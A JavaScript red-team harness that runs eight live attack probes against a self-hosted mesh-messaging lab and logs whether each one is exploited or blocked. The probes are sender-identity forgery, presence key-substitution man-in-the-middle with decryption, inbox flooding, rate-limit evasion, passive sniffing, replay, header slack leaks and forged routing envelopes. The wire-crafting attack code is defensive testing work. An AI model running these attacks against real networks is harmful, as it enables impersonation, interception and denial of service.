// xploit-sweep.mjs — XPLT team: active exploit hunting over the live
// Hydra WAN lab. Every probe is a real attack, not a linter pass:
//   XPLT-01 forged unsealed direct_msg — sender spoof via raw relay conn
//   XPLT-02 presence key-substitution — MITM decrypt via attacker wasm node
//   XPLT-03 inbox flood — drive the victim past the 4 MiB inbox read cap
//   XPLT-04 rate-limit evasion — per-conn limit vs multi-conn aggregate
//   XPLT-05 passive sniff — broadcast-hub metadata + plaintext theft
//   XPLT-06 replay — verbatim re-injection of a delivered frame
//   XPLT-07 header slack leak — bytes 37..40 of MessageHeader never written
//   XPLT-08 forged relay_route — attacker-authored routing envelope
//
//   node xploit-sweep.mjs --probe    lab already up (env: HYDRA_TOKEN, WAN_TOKEN)
//   node xploit-sweep.mjs --docker   drive docker-compose.wan.yml
//   add --keep to leave the lab running.
//
// Findings append to site/security/findings.json. Verdicts: EXPLOITED means
// the attack succeeded on the wire; BLOCKED/HELD means the layer refused.

import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { sleep, loadCore, wsConnect } from "./harness.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SITE = path.resolve(HERE, "../site");
const WASM = path.join(SITE, "apps", "rations", "rations.wasm");
const FINDINGS = path.resolve(SITE, "security/findings.json");
const DOCKER = process.argv.includes("--docker");
const KEEP = process.argv.includes("--keep");
const ORIGIN = "http://desk.local"; // relay Origin allowlist

const findings = [];
let cn = 0;
function f(name, verdict, detail, severity) {
  cn++;
  const row = { id: `XPLT-${String(cn).padStart(2, "0")}`, team: "XPLT", name, verdict, severity, detail, ts: new Date().toISOString() };
  findings.push(row);
  console.log(`  [${verdict.padEnd(8)}] XPLT-${String(cn).padStart(2, "0")} ${name}${detail ? " — " + detail : ""}`);
}
const held = (n, d) => f(n, "HELD", d, "info");
const blocked = (n, d) => f(n, "BLOCKED", d, "info");
const exploited = (n, d, sev = "high") => f(n, "EXPLOITED", d, sev);
const noted = (n, d) => f(n, "NOTED", d, "low");
const open_ = (n, d) => f(n, "OPEN", d, "medium");

const HYDRA_TOKEN = process.env.HYDRA_TOKEN || crypto.randomBytes(16).toString("hex");
const WAN_TOKEN = process.env.WAN_TOKEN || crypto.randomBytes(16).toString("hex");
const PORTS = { e1: 19301, e2: 19302, w1: 19401, w2: 19402, bridge: 19500 };
const WAN = { east: 19100, west: 19101 };
const Z = "00".repeat(32);
const ATTACKER_ID = crypto.randomBytes(32); // arbitrary 32B peer id — the mesh never verifies it

async function ctl(node, p, body) {
  const r = await fetch(`http://localhost:${PORTS[node]}${p}`, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json", "x-hydra-token": HYDRA_TOKEN },
    body: body ? JSON.stringify(body) : undefined,
  });
  return r.json();
}
async function wctl(side, p, body) {
  const r = await fetch(`http://localhost:${WAN[side]}${p}`, {
    method: body ? "POST" : "GET",
    headers: { "Content-Type": "application/json", "x-wan-token": WAN_TOKEN },
    body: body ? JSON.stringify(body) : undefined,
  });
  return r.json();
}
const compose = (...args) =>
  execFileSync("docker", ["compose", "-f", path.join(HERE, "docker-compose.wan.yml"), ...args],
    { env: { ...process.env, HYDRA_TOKEN, WAN_TOKEN }, stdio: "inherit" });

/* ---------- wire-craft helpers — the 41B MessageHeader + 71B RelayRouteHeader ---------- */
function frame(msgType, senderId, payload) {
  const h = Buffer.alloc(41);
  h[0] = msgType;
  Buffer.from(senderId).copy(h, 1);
  h.writeUInt32LE(payload.length, 33); // bytes 37..40 zeroed — honest craft
  return Buffer.concat([h, payload]);
}
function relayRoute(targetId, originId, innerType, inner, ttl = 8) {
  const r = Buffer.alloc(71);
  Buffer.from(targetId).copy(r, 0);
  Buffer.from(originId).copy(r, 32);
  r[64] = ttl; r[65] = 0; r[66] = innerType;
  r.writeUInt32LE(inner.length, 67);
  return Buffer.concat([r, inner]);
}
const hex32 = (b) => Buffer.from(b).toString("hex");
const dmsg = (kind, body) => Buffer.concat([Buffer.from([0, kind]), body]); // unsealed v1

/* per-probe drop-king snapshot — attributes dmsg_dropped deltas to the
   probe that caused them instead of only seeing the end-of-run totals */
async function snapDrops(label) {
  const out = [];
  for (const n of ["e1", "e2", "w1", "w2", "bridge"]) {
    const c = await ctl(n, "/counters").catch(() => null);
    if (c && c.dmsg_dropped > 0) out.push(`${n}:${c.dmsg_dropped}k${c.dmsg_drop_kind}`);
  }
  if (out.length) console.log(`    [drops@${label}] ${out.join(" ")}`);
}

/* raw broadcast-hub client: sees EVERYTHING the relay forwards and can
   ship arbitrary bytes — the lab's assumed adversary. */
async function rawClient(url) {
  const ws = await wsConnect(url, { origin: ORIGIN });
  const frames = [];
  ws.onData = (buf) => frames.push(Buffer.from(buf));
  return { ws, frames, send: (b) => ws.send(b) };
}
const peerId = (hex) => Buffer.from(hex, "hex");

async function inboxHas(node, needle) {
  const ib = await ctl(node, "/inbox");
  if (ib.inbox_overflow) return { overflow: true, found: false };
  return { overflow: false, found: ib.inbox.some((m) => Buffer.from(m.body_b64, "base64").toString().includes(needle)) };
}
async function prime(from, toPeer, toNode, text) {
  for (let i = 0; i < 24; i++) {
    await ctl(from, "/presence/send", { to: toPeer, status: 1, text });
    await sleep(1500);
    const pres = await ctl(toNode, "/presence");
    if (pres.presence.some((p) => p.peer === ids[from])) return true;
  }
  return false;
}

if (DOCKER) {
  console.log("[wan-lab] compose up…");
  compose("up", "-d", "--wait");
  /* wan-* containers run `apk add iproute2` (tc netem) BEFORE node starts
     — the healthcheck passes on the bound port while nothing listens
     behind it. Gate on the control plane actually answering. */
  for (const side of ["east", "west"]) {
    let up = false;
    for (let i = 0; i < 240 && !up; i++) {
      try { await wctl(side, "/stats"); up = true; } catch { await sleep(1000); }
    }
    if (!up) { console.error(`[wan-lab] wan-${side} control never came up`); process.exit(2); }
  }
  /* Same race on the node side: the container binds the port before
     hydra-node's HTTP server actually accepts. Gate /id on every node
     before dialing. */
  for (const n of ["e1", "e2", "w1", "w2", "bridge"]) {
    let up = false;
    for (let i = 0; i < 120 && !up; i++) {
      try { await ctl(n, "/id"); up = true; } catch { await sleep(1000); }
    }
    if (!up) { console.error(`[wan-lab] node ${n} control never came up`); process.exit(2); }
  }
  for (const [n, url] of [["e1", "ws://relay-east:8080/ws"], ["e2", "ws://relay-east:8080/ws"],
                          ["w1", "ws://relay-west:8080/ws"], ["w2", "ws://relay-west:8080/ws"],
                          ["bridge", "ws://wan-east:9100/ws"], ["bridge", "ws://wan-west:9100/ws"]])
    await ctl(n, "/dial", { url, remote: Z });
  await sleep(2500);
  for (const n of ["e1", "e2", "w1", "w2"]) await ctl(n, "/discover", { conn: 1 });
  await ctl("bridge", "/discover", { conn: 1 });
  await ctl("bridge", "/discover", { conn: 2 });
  await sleep(6000);
  await wctl("west", "/impair", { delay: 120, jitter: 60, drop: 0, reorder: 0 });
}

const ids = {};
for (const n of ["e1", "w1", "w2"]) ids[n] = (await ctl(n, "/id")).peer_id;
await prime("e1", ids.w1, "w1", "e1");
await prime("w1", ids.e1, "e1", "w1");
/* confirm the authenticated channel: a sealed+signed exchange arms each
   side's downgrade gate for the other (post-XPLT-01 remediation the gate
   keys on confirmed crypto state, not mere presence pinning) */
await ctl("e1", "/send", { to: ids.w1, body_b64: Buffer.from("prime-e1w1").toString("base64") });
await ctl("w1", "/send", { to: ids.e1, body_b64: Buffer.from("prime-w1e1").toString("base64") });
for (let i = 0; i < 12; i++) {
  await sleep(800);
  const a = await inboxHas("w1", "prime-e1w1");
  const b = await inboxHas("e1", "prime-w1e1");
  if (a.found && b.found) break;
}
console.log("  [lab] primed; attackers attach to relay-west");
await snapDrops("prime");

/* XPLT-01: forged unsealed direct_msg — sender_id is transport-asserted,
   unsigned. A raw client on the victim's relay writes any identity.
   Post-remediation the honest split is two-tier: forged unsigned mail
   claiming a peer with a CONFIRMED authenticated channel (w1↔e1 just
   exchanged sealed+signed v3) must be refused; claiming a peer the victim
   never confirmed (w2 has no authenticated channel with e1) still lands
   — marked sealed:false signed:false, the documented first-contact
   residual that only mandatory-signing policy could close. */
{
  const atk = await rawClient("ws://localhost:19101/ws");
  const tag = `FORGED-SPOOF-${Date.now().toString(36)}`;
  // sender_id = e1 — the frame claims to BE e1. w1's inbox (confirmed
  // channel) must refuse; w2's (unconfirmed) may accept marked untrusted.
  await atk.send(frame(15, peerId(ids.e1), dmsg(0, Buffer.from(tag))));
  await sleep(1500);
  const hitW1 = await inboxHas("w1", tag);
  const hitW2 = await inboxHas("w2", tag);
  try { atk.ws.close(); } catch {}
  const w2meta = hitW2.found ? (await ctl("w2", "/inbox")).inbox.find((m) => Buffer.from(m.body_b64, "base64").toString().includes(tag)) : null;
  if (!hitW1.found && !hitW2.found)
    held("unsealed-sender-forgery", "forged frame refused at both confirmed and unconfirmed targets");
  else if (!hitW1.found && hitW2.found)
    noted("unsealed-sender-forgery", `confirmed-channel target (w1) refused; unconfirmed target (w2) accepted marked sealed=${w2meta?.sealed} signed=${w2meta?.signed} — first-contact residual, no authenticity claim made`);
  else
    exploited("unsealed-sender-forgery", `forged unsigned frame landed at w1=${hitW1.found} w2=${hitW2.found} — confirmed-channel downgrade gate failed`);
}

/* XPLT-02: presence key-substitution MITM — forged presence rewrites
   w1's contact key for e1 to the ATTACKER's X25519 pk. w1's next sealed
   send encrypts to the attacker; the broadcast relay hands the
   ciphertext to the attacker's sniffer; the attacker's own wasm node
   decrypts it. Full chain demonstrated in-wasm, no JS crypto. */
{
  // attacker wasm node — a real identity, never dialed
  const core = await loadCore(WASM);
  const { ex, wr, outBuf } = core;
  const skBuf = outBuf(32), pkBuf = outBuf(32);
  ex.rations_phone_gen_identity(skBuf, pkBuf);
  ex.rations_phone_set_identity(skBuf);
  const atkPk = Buffer.from(core.mem(pkBuf, 32)).slice();

  const atk = await rawClient("ws://localhost:19101/ws");
  // spam forged presence: sender_id=e1, phone_pk=attacker — wins the
  // last-write race against e1's legitimate re-beacons
  const poison = frame(17, peerId(ids.e1),
    Buffer.concat([Buffer.from([1]), atkPk, Buffer.from("mitm")]));
  const poisonTimer = setInterval(() => { try { atk.ws.send(poison); } catch {} }, 150);

  await sleep(1200); // let the poison land
  // victim sends a sealed message to e1 — sealed to whatever key is in
  // w1's contact map at seal time
  const secret = `MITM-PROOF-${Date.now().toString(36)}`;
  await ctl("w1", "/send", { to: ids.e1, body_b64: Buffer.from(secret).toString("base64") });
  await sleep(2500);
  clearInterval(poisonTimer);

  // sniffer: collect EVERY sealed inner payload targeting e1 — receipts,
  // retries and the secret all look alike on the wire; try them all
  const captured = [];
  for (const buf of atk.frames) {
    if (buf[0] !== 11 || buf.length < 41 + 71) continue;
    const target = buf.subarray(41, 73);           // relay hdr target_id
    const innerType = buf[41 + 66];
    const innerLen = buf.readUInt32LE(41 + 67);
    if (!target.equals(peerId(ids.e1)) || innerType !== 15) continue;
    const inner = buf.subarray(41 + 71, 41 + 71 + innerLen);
    if (inner.length >= 61 && (inner[0] & 1)) captured.push(inner); // sealed direct_msg payload
  }

  let read = false, dropEvidence = null;
  for (const inner of captured) {
    // feed the stolen sealed payload into the attacker's wasm node as if
    // it were a direct_msg from w1 — the phone layer unseals it with the
    // attacker's secret
    const fake = frame(15, peerId(ids.w1), inner);
    const fp = wr(fake);
    ex.rations_ws_on_message(4242, fp, fake.length);
  }
  if (captured.length) {
    const ib = outBuf(256 * 1024), lp = outBuf(4);
    ex.rations_phone_inbox_json(ib, 256 * 1024, lp);
    const n = core.u32(lp);
    const j = JSON.parse(Buffer.from(core.mem(ib, n)).toString() || "[]");
    read = JSON.stringify(j).includes(secret);
  }
  const e1c = await ctl("e1", "/counters").catch(() => ({}));
  /* kind=4 (DecryptFailed) is the only victim-side signal that proves a
     seal went to a foreign key; kind=8 (DuplicateMsgId) is dedup working,
     kind=9 (BadSignature) is the v3 gate refusing an unsigned claim. */
  if (e1c.dmsg_dropped > 0 && e1c.dmsg_drop_kind === 4)
    dropEvidence = `e1 dmsg_dropped=${e1c.dmsg_dropped} kind=${e1c.dmsg_drop_kind}`;
  try { atk.ws.close(); } catch {}

  read
    ? exploited("presence-key-substitution-mitm", `forged presence rewrote w1's contact key for e1 to an attacker-held key — w1's sealed message decrypted in the attacker's own wasm instance; victim side: ${dropEvidence || "no drop counter delta"}`, "critical")
    : captured.length
      ? (dropEvidence
          ? noted("presence-key-substitution-mitm", `${captured.length} sealed frames captured, attacker decrypt failed — but victim-side drop (${dropEvidence}) shows the seal went to a foreign key`)
          : blocked("presence-key-substitution-mitm", `${captured.length} sealed frame(s) captured off the broadcast hub but the attacker cannot open them — first-seen key pinning held the contact map`))
      : held("presence-key-substitution-mitm", `no sealed frame targeted at e1 captured${dropEvidence ? "; " + dropEvidence : ""}`);
  await snapDrops("02");
}

/* XPLT-03: inbox flood — unsealed forged msgs drive the victim's
   serialized inbox past the 4 MiB read cap → inbox_overflow, the
   victim's observation plane goes blind while bodies still land. */
{
  const atk = await rawClient("ws://localhost:19101/ws");
  let sent = 0;
  const body = Buffer.alloc(240 * 1024, "F"); // ~240 KB per forged msg
  for (let i = 0; i < 20; i++) {
    try { await atk.send(frame(15, peerId(ATTACKER_ID), dmsg(0, body))); sent++; }
    catch { break; }
    await sleep(320); // stay under the 1 MiB/s per-conn byte rate
  }
  await sleep(1500);
  const ib = await ctl("w1", "/inbox");
  try { atk.ws.close(); } catch {}
  ib.inbox_overflow
    ? exploited("inbox-flood-dos", `${sent} × 240 KB forged messages overflowed w1's inbox serializer — /inbox now reports inbox_overflow; victim's read plane is blind while the writes keep landing`, "medium")
    : noted("inbox-flood-dos", `${sent} forged msgs sent — inbox held (count=${ib.count ?? ib.inbox?.length}); bounded inbox evicted/absorbed the flood without blinding`);
}

/* XPLT-04: rate-limit evasion — single conn over 100 msg/s must die;
   N conns each under the limit carry an aggregate flood. */
{
  // single-conn burst
  const a1 = await rawClient("ws://localhost:19101/ws");
  let closed = false;
  a1.ws.onClose = () => { closed = true; };
  for (let i = 0; i < 140; i++) { try { a1.ws.send(frame(9, peerId(ATTACKER_ID), Buffer.alloc(0))); } catch { break; } }
  await sleep(1500);
  closed = closed || a1.ws.state === 4;
  // multi-conn aggregate — 6 conns × 90 msgs in <1s = 540 msgs/s aggregate,
  // deliberately over the 4× per-conn per-IP ceiling
  /* measure what the cap is FOR: a victim-side sniffer counts how many
     of the 540 attack frames actually got relayed. The per-IP ceiling is
     400 msg/s — bounded delivery ≤ cap means the aggregate bound held;
     substantially over means it leaked. Conn-aliveness was a bad proxy
     (boundary ordering flipped 3/6↔4/6 between runs). */
  const sniff = await rawClient("ws://localhost:19101/ws");
  const before = sniff.frames.length;
  const conns = [];
  for (let i = 0; i < 6; i++) conns.push(await rawClient("ws://localhost:19101/ws"));
  for (const c of conns) for (let i = 0; i < 90; i++) c.send(frame(9, peerId(ATTACKER_ID), Buffer.alloc(0)));
  await sleep(1500);
  let alive = 0;
  for (const c of conns) { try { if (c.ws.state !== 4) { c.send(frame(9, peerId(ATTACKER_ID), Buffer.alloc(0))); alive++; } } catch {} }
  for (const c of conns) { try { c.ws.close(); } catch {} }
  await sleep(500);
  /* Count only attack frames — sender_id == ATTACKER_ID at bytes 1..33.
     Ambient segment traffic (presence, announce, other probes) rides the
     same broadcast hub and must not inflate the measurement. */
  const relayed = sniff.frames.slice(before)
    .filter((fr) => fr.length >= 33 && fr.subarray(1, 33).equals(ATTACKER_ID)).length;
  try { sniff.ws.close(); } catch {}
  const singleNote = closed ? "single-conn burst closed" : "single-conn burst survived";
  const CAP = 400;
  relayed > CAP + 80 // cap + in-flight margin
    ? exploited("rate-limit-evasion", `${singleNote}; ${relayed}/540 attack frames relayed — aggregate bound leaked past the ${CAP}/s per-IP ceiling`, "medium")
    : held("rate-limit-evasion", `${singleNote}; ${relayed}/540 attack frames relayed — per-IP ceiling bounded the flood (≤${CAP}/s), ${alive}/6 conns still alive`);
}

/* XPLT-05: passive sniff — one raw conn hears every frame on the
   segment: full traffic metadata + any unsealed payload. */
{
  const sn = await rawClient("ws://localhost:19101/ws");
  const seen = new Set();
  const types = {};
  // generate legit traffic to sniff
  await ctl("e1", "/presence/send", { to: ids.w1, status: 1, text: "sniffme" }).catch(() => {});
  await sleep(2500);
  for (const buf of sn.frames) {
    if (buf.length < 41) continue;
    types[buf[0]] = (types[buf[0]] || 0) + 1;
    seen.add(hex32(buf.subarray(1, 9))); // sender-id prefix = metadata
  }
  try { sn.ws.close(); } catch {}
  sn.frames.length > 0
    ? exploited("broadcast-hub-sniff", `one passive conn captured ${sn.frames.length} frames, ${Object.keys(types).length} msg types, ${seen.size} distinct senders — zero subscription control on the relay; every byte on the segment is public`, "medium")
    : held("broadcast-hub-sniff", "no frames captured on the passive conn");
}

/* XPLT-06: replay — capture a delivered relay_route verbatim, re-inject
   it later. v1 direct_msgs carry no msg_id; the dedup seen-set key is
   content+hop — a replay at hop 0 beats the stored floor. */
{
  const atk = await rawClient("ws://localhost:19101/ws");
  // make a legit sealed-ish send to capture
  const tag = `REPLAY-${Date.now().toString(36)}`;
  const sniffBefore = atk.frames.length;
  await ctl("e1", "/send", { to: ids.w1, body_b64: Buffer.from(tag).toString("base64") });
  await sleep(2000);
  let replay = null;
  for (const buf of atk.frames.slice(sniffBefore)) {
    if (buf[0] === 11 && buf.subarray(41, 73).equals(peerId(ids.w1))) { replay = Buffer.from(buf); break; }
    if (buf[0] === 15 && buf.subarray(1, 33).equals(peerId(ids.e1))) { replay = Buffer.from(buf); break; }
  }
  let dup = false;
  if (replay) {
    const cnt0 = (await ctl("w1", "/inbox")).inbox?.filter((m) => Buffer.from(m.body_b64, "base64").toString().includes(tag)).length || 0;
    await atk.send(replay); // verbatim, hop 0 → dedup accepts as fresh
    await sleep(1500);
    const cnt1 = (await ctl("w1", "/inbox")).inbox?.filter((m) => Buffer.from(m.body_b64, "base64").toString().includes(tag)).length || 0;
    dup = cnt1 > cnt0;
  }
  try { atk.ws.close(); } catch {}
  dup
    ? exploited("frame-replay", `captured frame re-injected verbatim → duplicate delivery (${"v1 carries no msg_id; hop-0 replay resets the dedup floor"})`, "low")
    : replay
      ? held("frame-replay", "captured frame re-injected — no duplicate delivery (dedup floor held)")
      : noted("frame-replay", "no capturable frame observed — probe under-sampled");
  await snapDrops("06");
}

/* XPLT-07: header slack leak — MessageHeader is 41 B but serialize
   writes only 37; bytes [37..41] are uninitialized heap broadcast to
   every peer. Inspect captured frames for nonzero slack. */
{
  const atk = await rawClient("ws://localhost:19101/ws");
  await ctl("e1", "/presence/send", { to: ids.w1, status: 1, text: "leak-check" }).catch(() => {});
  await ctl("w1", "/presence/send", { to: ids.e1, status: 1, text: "leak-check" }).catch(() => {});
  await sleep(2500);
  let frames = 0, nonzero = 0;
  for (const buf of atk.frames) {
    if (buf.length < 41) continue;
    frames++;
    if (buf.subarray(37, 41).some((b) => b !== 0)) nonzero++;
  }
  try { atk.ws.close(); } catch {}
  nonzero > 0
    ? exploited("header-slack-leak", `${nonzero}/${frames} frames carry nonzero bytes[37..41] — stale heap (freed payloads, key material, inbox bodies) broadcast to every relay peer on every frame`, "medium")
    : frames > 0
      ? held("header-slack-leak", `${frames} frames inspected — slack bytes all zero (serialize now writes them)`)
      : noted("header-slack-leak", "no frames captured to inspect");
}

/* XPLT-08: forged relay_route — attacker writes the routing envelope
   itself: arbitrary target, arbitrary origin, attacker-chosen TTL. */
{
  const atk = await rawClient("ws://localhost:19101/ws");
  const tag = `ROUTE-FORGE-${Date.now().toString(36)}`;
  const inner = dmsg(0, Buffer.from(tag));
  const rr = relayRoute(peerId(ids.w1), peerId(ATTACKER_ID), 15, inner);
  await atk.send(frame(11, peerId(ATTACKER_ID), rr));
  await sleep(1500);
  const hit = await inboxHas("w1", tag);
  const meta = hit.found ? (await ctl("w1", "/inbox")).inbox.find((m) => Buffer.from(m.body_b64, "base64").toString().includes(tag)) : null;
  try { atk.ws.close(); } catch {}
  hit.found && meta?.signed
    ? exploited("forged-relay-route", "attacker-authored relay_route delivered a dmsg that the victim treated as AUTHENTICATED — signature check bypassed", "critical")
    : hit.found
      ? noted("forged-relay-route", `attacker-authored relay_route delivered, but the frame landed marked sealed=${meta?.sealed} signed=${meta?.signed} — unauthenticated residual: routing envelopes are unsigned and unconfirmed first-contact accepts untrusted content`)
      : held("forged-relay-route", "forged relay_route refused or died before target");
  await snapDrops("08");
}

/* drop-plane snapshot */
{
  for (const n of Object.keys(PORTS)) {
    try {
      const c = await ctl(n, "/counters");
      console.log(`  [drops] ${n}: dmsg_dropped=${c.dmsg_dropped ?? "?"} kind=${c.dmsg_drop_kind ?? "?"} route_nohop=${c.route_nohop ?? "?"} route_dup=${c.route_dup ?? "?"} rx=${c.received ?? "?"} fwd=${c.forwarded ?? "?"}`);
    } catch (e) { console.log(`  [drops] ${n}: ${e.message}`); }
  }
}

/* ledger append — same contract as comms-suite */
if (findings.length) {
  const led = JSON.parse(fs.readFileSync(FINDINGS, "utf8"));
  led.findings.push(...findings);
  fs.writeFileSync(FINDINGS, JSON.stringify(led, null, 2) + "\n");
  const tally = findings.reduce((m, x) => (m[x.verdict] = (m[x.verdict] || 0) + 1, m), {});
  console.log(`\nXPLT sweep: ${cn} probes — ${JSON.stringify(tally)}`);
}

if (DOCKER && !KEEP) { console.log("[wan-lab] compose down"); try { compose("down"); } catch {} }
